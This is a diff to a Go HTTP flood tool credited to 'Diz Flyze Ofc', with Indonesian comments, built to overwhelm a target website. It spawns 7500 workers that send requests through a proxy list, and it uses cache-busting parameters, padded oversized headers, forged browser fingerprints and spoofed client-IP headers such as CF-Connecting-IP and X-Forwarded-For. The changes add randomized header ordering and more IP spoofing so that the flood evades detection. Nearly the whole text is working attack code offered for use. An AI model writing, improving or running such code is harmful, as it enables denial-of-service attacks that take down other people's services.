@@ -24,39 +24,36 @@ import (
 
 // ================== WARNA ==================
 const (
-	HAPUS = "\033[0m"
-	MERAH = "\033[31m"
-	IJO   = "\033[32m"
-	PUTIH = "\033[37m"
-	CANDY = "\033[91m"
-	PUCAT = "\033[38;5;203m"
+	HAPUS  = "\033[0m"
+	MERAH  = "\033[31m"
+	IJO    = "\033[32m"
+	PUTIH  = "\033[37m"
+	CANDY  = "\033[91m"
+	PUCAT  = "\033[38;5;203m"
 	PUNYAMU = "\033[38;5;204m"
 	PUNYA_LU_PUCAT = "\033[38;5;218m"
 	MASA_DEPAN_NYA = "\033[97m"
 
-	// ================== Tergantung spek ==================
-	Speed = 7500 // Kalo vps lu kentang turunin tak
-	// ================== Tergantung Proxy ==================
-	to = 6 * time.Second // Timeout
-	// ================== Tergantung Target ==================
-	KEP = 30 * time.Second // Keep-Alive
+	Speed = 7500
+	to    = 6 * time.Second
+	KEP   = 30 * time.Second
 )
 
 // ================== PROF ==================
 type BPF struct {
-	UA            string
-	Accept        string
-	Lang          string
-	Encoding      string
-	SecChUa       string
-	SecChUaMov    string
-	SecChUaPlat   string
-	SecFetchSite  string
-	SecFetchMode  string
-	SecFetchDest  string
-	Referer       string
-	Origin        string
-	DNT           string
+	UA           string
+	Accept       string
+	Lang         string
+	Encoding     string
+	SecChUa      string
+	SecChUaMov   string
+	SecChUaPlat  string
+	SecFetchSite string
+	SecFetchMode string
+	SecFetchDest string
+	Referer      string
+	Origin       string
+	DNT          string
 }
 
 // ================== BROWSER ==================
@@ -320,7 +317,6 @@ func PHR(target string, ProxyX string) map[string]bool {
 		ProxyX = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
 	}
 
-	// ================== HEADERS BYPASS ==================
 	HeadersBypas := []string{
 		"X-Original-URL",
 		"X-Forwarded-Host",
@@ -496,40 +492,6 @@ func REFFERER(target string) []string {
 	return valid
 }
 
-// ================== IP HEADERS ==================
-func PPHEAD(target string, proxyIPs []string) []string {
-	testIPs := []string{"127.0.0.1", "192.168.1.1", "10.0.0.1", "8.8.8.8"}
-	for _, p := range proxyIPs {
-		if p != "" {
-			testIPs = append(testIPs, p)
-		}
-	}
-	var valid []string
-	client := &http.Client{
-		Timeout: 3 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	for _, ip := range testIPs {
-		req, _ := http.NewRequest("GET", target, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		req.Header.Set("X-Forwarded-For", ip)
-		resp, err := client.Do(req)
-		if err != nil {
-			continue
-		}
-		resp.Body.Close()
-		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
-			valid = append(valid, ip)
-		}
-	}
-	if len(valid) == 0 {
-		valid = append(valid, "127.0.0.1")
-	}
-	return valid
-}
-
 // ================== METHOD HTTP ==================
 func HMETHOD(target string) []string {
 	methods := []string{"GET", "POST", "OPTIONS"}
@@ -620,17 +582,6 @@ func CACH(target string) []string {
 	return valid
 }
 
-// ================== GABUNGKAN ==================
-type PREST struct {
-	VOR []string
-	VUA []string
-	VRE []string
-	VPH []string
-	VME []string
-	VEN []string
-	VCC []string
-}
-
 // ================== ORIGIN ==================
 type ORPL struct {
 	Origin       string
@@ -638,7 +589,6 @@ type ORPL struct {
 	SecFetchSite string
 }
 
-// ================== ORIGIN PROF ==================
 func GPFO(origin string, host string) ORPL {
 	switch origin {
 	case "https://" + host:
@@ -699,7 +649,6 @@ func main() {
 
 	var PRX []*url.URL
 
-	// ================== Nama Proxy ==================
 	file, err := os.Open("proxy.txt")
 	if err == nil {
 		defer file.Close()
@@ -731,7 +680,13 @@ func main() {
 		ProxyX = proxyIPs[0]
 	}
 
-	// ================== BYPASS (PROBING PARALEL) ==================
+	// Siapkan daftar IP untuk header (fallback jika tidak ada proxy)
+	ipPool := proxyIPs
+	if len(ipPool) == 0 {
+		ipPool = []string{"127.0.0.1", "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"}
+	}
+
+	// ================== PROBING ==================
 	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
 	var (
@@ -742,25 +697,23 @@ func main() {
 		VORI      []string
 		VUAS      []string
 		VREF      []string
-		VIPS      []string
 		VMET      []string
 		VENC      []string
 		VCAC      []string
 	)
 
 	var wg sync.WaitGroup
-	wg.Add(11)
+	wg.Add(10)
 
 	var probeDone int
 	var probeMu sync.Mutex
 
-	// fungsi helper buat print progress
 	printProbe := func(name string) {
 		probeMu.Lock()
 		probeDone++
 		done := probeDone
 		probeMu.Unlock()
-		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/11)
+		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/10)
 	}
 
 	go func() {
@@ -800,11 +753,6 @@ func main() {
 	}()
 	go func() {
 		defer wg.Done()
-		VIPS = PPHEAD(tgt, proxyIPs)
-		printProbe("PPHEAD")
-	}()
-	go func() {
-		defer wg.Done()
 		VMET = HMETHOD(tgt)
 		printProbe("HMETHOD")
 	}()
@@ -822,20 +770,8 @@ func main() {
 	wg.Wait()
 	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
 
-	PRLT := PREST{
-		VOR: VORI,
-		VUA: VUAS,
-		VRE: VREF,
-		VPH: VIPS,
-		VME: VMET,
-		VEN: VENC,
-		VCC: VCAC,
-	}
-	_ = PRLT
-
+	// ================== BUAT CLIENT ==================
 	wcs := make([]CLI, len(PRX))
-
-	// ================== H2-FLOW ==================
 	for i, ProxyY := range PRX {
 		tr := &http.Transport{
 			DialContext: (&net.Dialer{
@@ -915,7 +851,6 @@ func main() {
 		}
 	}
 
-	// ================== INFO ==================
 	printInfo("Author", "Diz Flyze Ofc              ", "True")
 	printInfo("Target", host, "")
 	printInfo("Port  ", "443                        ", "True")
@@ -971,6 +906,11 @@ func main() {
 	}
 
 	// ================== WORKER ==================
+	// struct untuk dynamic header ordering
+	type headerItem struct {
+		key, value string
+	}
+
 	for i := 0; i < Speed; i++ {
 		wg2.Add(1)
 		c := wcs[i%len(wcs)]
@@ -983,134 +923,146 @@ func main() {
 				ref := VREF[rng.Intn(len(VREF))]
 				enc := VENC[rng.Intn(len(VENC))]
 				cacheCtrl := VCAC[rng.Intn(len(VCAC))]
-				FORIP := VIPS[rng.Intn(len(VIPS))]
 
-				// ================== ORIGIN ==================
+				FORIP := ipPool[rng.Intn(len(ipPool))]
+				realIP := cli.ip
+				if realIP == "" {
+					realIP = FORIP
+				}
+
 				SLOR := VORI[rng.Intn(len(VORI))]
 				OPRF := GPFO(SLOR, host)
-
-				// ================== BROWSER ==================
 				prof := PFS[rng.Intn(len(PFS))]
 
-				// ================== DAMAGE ==================
-				Target := tgt
-				param := CBP[rng.Intn(len(CBP))]
-				if strings.Contains(Target, "?") {
-					Target += "&" + param + "=" + strconv.FormatInt(rng.Int63(), 10)
+				// ===== POIN 3: multiple parameter (2-3) =====
+				params := []string{}
+				for j := 0; j < 2+rng.Intn(2); j++ {
+					key := CBP[rng.Intn(len(CBP))]
+					val := strconv.FormatInt(rng.Int63(), 10)
+					params = append(params, key+"="+val)
+				}
+				var targetURL string
+				if strings.Contains(tgt, "?") {
+					targetURL = tgt + "&" + strings.Join(params, "&")
 				} else {
-					Target += "?" + param + "=" + strconv.FormatInt(rng.Int63(), 10)
+					targetURL = tgt + "?" + strings.Join(params, "&")
 				}
 				if MaxP > 0 && rng.Intn(3) == 0 {
 					size := MaxP/2 + rng.Intn(MaxP/2)
 					if size < 1 {
 						size = 64
 					}
-					Target += "&big=" + strings.Repeat("x", size)
+					targetURL += "&big=" + strings.Repeat("x", size)
 				}
 				if rng.Intn(10) == 0 {
-					Target += "&" + RST(rng, 8) + "=" + RST(rng, 12)
+					targetURL += "&" + RST(rng, 8) + "=" + RST(rng, 12)
 				}
 
-				// ================== REQUEST ==================
-				var req *http.Request
+				// Buat request tanpa header dulu
 				var body io.Reader
 				if method == "POST" {
 					body = strings.NewReader("")
 				} else {
 					body = nil
 				}
-				req, _ = http.NewRequest(method, Target, body)
+				req, _ := http.NewRequest(method, targetURL, body)
+				// Header akan diisi setelah dikumpulkan dan diacak
+				// Kita kumpulkan semua header dalam slice
+				headers := []headerItem{}
+
+				// Method POST specific
 				if method == "POST" {
-					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+					headers = append(headers, headerItem{"Content-Type", "application/x-www-form-urlencoded"})
 				}
 
-				// ================== HEADERS ==================
-				req.Header.Set("User-Agent", ua)
-				req.Header.Set("Accept-Encoding", enc)
-				req.Header.Set("Cache-Control", cacheCtrl)
+				// Header dasar
+				headers = append(headers, headerItem{"User-Agent", ua})
+				headers = append(headers, headerItem{"Accept-Encoding", enc})
+				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})
 
-				// ================== ORIGIN ==================
 				if OPRF.Origin != "" && OPRF.Referer != "" {
-					req.Header.Set("Referer", OPRF.Referer)
+					headers = append(headers, headerItem{"Referer", OPRF.Referer})
 				} else if ref != "" {
-					req.Header.Set("Referer", ref)
+					headers = append(headers, headerItem{"Referer", ref})
 				}
 				if OPRF.Origin != "" {
-					req.Header.Set("Origin", OPRF.Origin)
+					headers = append(headers, headerItem{"Origin", OPRF.Origin})
 				}
-				req.Header.Set("Sec-Fetch-Site", OPRF.SecFetchSite)
+				headers = append(headers, headerItem{"Sec-Fetch-Site", OPRF.SecFetchSite})
 
-				// ================== HEADERS ==================
-				req.Header.Set("Accept", prof.Accept)
-				req.Header.Set("Accept-Language", prof.Lang)
-				req.Header.Set("Connection", "keep-alive")
-				req.Header.Set("Pragma", "no-cache")
-				req.Header.Set("Upgrade-Insecure-Requests", "1")
-				req.Header.Set("If-Modified-Since", ifModifiedSince)
-				req.Header.Set("X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16))
+				headers = append(headers, headerItem{"Accept", prof.Accept})
+				headers = append(headers, headerItem{"Accept-Language", prof.Lang})
+				headers = append(headers, headerItem{"Connection", "keep-alive"})
+				headers = append(headers, headerItem{"Pragma", "no-cache"})
+				headers = append(headers, headerItem{"Upgrade-Insecure-Requests", "1"})
+				headers = append(headers, headerItem{"If-Modified-Since", ifModifiedSince})
+				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16)})
+
 				if prof.SecChUa != "" {
-					req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
-					req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
-					req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
+					headers = append(headers, headerItem{"Sec-Ch-Ua", prof.SecChUa})
+					headers = append(headers, headerItem{"Sec-Ch-Ua-Mobile", prof.SecChUaMov})
+					headers = append(headers, headerItem{"Sec-Ch-Ua-Platform", prof.SecChUaPlat})
 				}
-				req.Header.Set("Sec-Fetch-Mode", prof.SecFetchMode)
-				req.Header.Set("Sec-Fetch-Dest", prof.SecFetchDest)
+				headers = append(headers, headerItem{"Sec-Fetch-Mode", prof.SecFetchMode})
+				headers = append(headers, headerItem{"Sec-Fetch-Dest", prof.SecFetchDest})
 				if prof.DNT != "" {
-					req.Header.Set("DNT", prof.DNT)
+					headers = append(headers, headerItem{"DNT", prof.DNT})
 				}
 
-				// ================== DAMAGE ==================
+				// Header acak tambahan
 				if rng.Intn(3) == 0 {
-					req.Header.Set("TE", "trailers")
+					headers = append(headers, headerItem{"TE", "trailers"})
 				}
 				if rng.Intn(4) == 0 {
-					req.Header.Set("A-IM", "Feed")
+					headers = append(headers, headerItem{"A-IM", "Feed"})
 				}
 				if rng.Intn(4) == 0 {
-					req.Header.Set("Delta-Base", "12340001")
+					headers = append(headers, headerItem{"Delta-Base", "12340001"})
 				}
 				if rng.Intn(3) == 0 {
-					req.Header.Set("dnt", "1")
+					headers = append(headers, headerItem{"dnt", "1"})
 				}
 				if rng.Intn(4) == 0 {
-					req.Header.Set("Access-Control-Request-Method", "GET")
+					headers = append(headers, headerItem{"Access-Control-Request-Method", "GET"})
 				}
 				if rng.Intn(5) == 0 {
-					req.Header.Set("source-ip", RST(rng, 5))
+					headers = append(headers, headerItem{"source-ip", RST(rng, 5)})
 				}
 				if rng.Intn(4) == 0 {
-					req.Header.Set("Data-Return", "false")
+					headers = append(headers, headerItem{"Data-Return", "false"})
 				}
+
+				// Header bypass (dikirim tanpa if, langsung semua)
 				if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
-					req.Header.Set("X-Original-URL", "/"+strconv.FormatInt(rng.Int63(), 16))
+					headers = append(headers, headerItem{"X-Original-URL", "/" + strconv.FormatInt(rng.Int63(), 16)})
 				}
 				if Supported["X-Forwarded-Host"] && rng.Intn(3) == 0 {
-					req.Header.Set("X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16)+"t.me/ytdizflyze")
+					headers = append(headers, headerItem{"X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16) + "t.me/ytdizflyze"})
 				}
 				if Supported["X-Request-ID"] && rng.Intn(3) == 0 {
-					req.Header.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))
+					headers = append(headers, headerItem{"X-Request-ID", strconv.FormatInt(rng.Int63(), 16)})
 				}
 				if Supported["CF-Connecting-IP"] && rng.Intn(5) == 0 {
-					req.Header.Set("CF-Connecting-IP", cli.ip)
+					headers = append(headers, headerItem{"CF-Connecting-IP", realIP})
 				}
 				if Supported["True-Client-IP"] && rng.Intn(5) == 0 {
-					req.Header.Set("True-Client-IP", cli.ip)
+					headers = append(headers, headerItem{"True-Client-IP", realIP})
 				}
 				if Supported["CDN-Loop"] && rng.Intn(5) == 0 {
-					req.Header.Set("CDN-Loop", "cloudflare")
+					headers = append(headers, headerItem{"CDN-Loop", "cloudflare"})
 				}
 				if rng.Intn(5) == 0 {
-					req.Header.Set("X-Real-IP", cli.ip)
+					headers = append(headers, headerItem{"X-Real-IP", realIP})
 				}
 				if MaxHead > 0 && rng.Intn(2) == 0 {
 					size := MaxHead/2 + rng.Intn(MaxHead/2)
 					if size < 1 {
 						size = 512
 					}
-					req.Header.Set("X-Large-Data", strings.Repeat("x", size))
+					headers = append(headers, headerItem{"X-Large-Data", strings.Repeat("x", size)})
 				}
 
-				// ================== COOKIE ==================
+				// Cookie
 				var cookies []string
 				if CCK != "" {
 					cookies = append(cookies, CCK)
@@ -1121,18 +1073,38 @@ func main() {
 					}
 				}
 				if len(cookies) > 0 {
-					req.Header.Set("Cookie", strings.Join(cookies, "; "))
+					headers = append(headers, headerItem{"Cookie", strings.Join(cookies, "; ")})
 				}
 
-				// ================== IP FAKE ==================
-				pid := cli.ip
-				if pid == "" {
-					pid = FORIP
-				}
-				req.Header.Set("X-Forwarded-For", pid)
-				req.Header.Set("X-Real-IP", pid)
+				// IP header
+				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
+				headers = append(headers, headerItem{"X-Real-IP", realIP})
 
-				// ================== EKSEKUSI ==================
+				// ===== POIN 5: Range header =====
+				headers = append(headers, headerItem{"Range", "bytes=0-"})
+
+				// ===== POIN 7: header tambahan =====
+				headers = append(headers, headerItem{"If-None-Match", `"` + RST(rng, 16) + `"`})
+				headers = append(headers, headerItem{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
+				headers = append(headers, headerItem{"Accept-Language", "en-US,en;q=0.9,id;q=0.8"})
+				headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + RIP(rng)})
+				headers = append(headers, headerItem{"X-Originating-IP", realIP})
+				headers = append(headers, headerItem{"X-Remote-IP", realIP})
+				headers = append(headers, headerItem{"X-Remote-Addr", realIP})
+				headers = append(headers, headerItem{"X-Client-IP", realIP})
+
+				// ===== DYNAMIC HEADER ORDERING =====
+				// Acak urutan header
+				rng.Shuffle(len(headers), func(i, j int) {
+					headers[i], headers[j] = headers[j], headers[i]
+				})
+				// Kosongkan header bawaan, lalu set ulang dengan urutan acak
+				req.Header = make(http.Header)
+				for _, h := range headers {
+					req.Header.Set(h.key, h.value)
+				}
+
+				// Kirim request
 				resp, err := cli.client.Do(req)
 				if err == nil {
 					io.Copy(io.Discard, resp.Body)
@@ -1142,7 +1114,6 @@ func main() {
 		}(c, i)
 	}
 
-	// ================== CTRL/TIME ==================
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 	select {
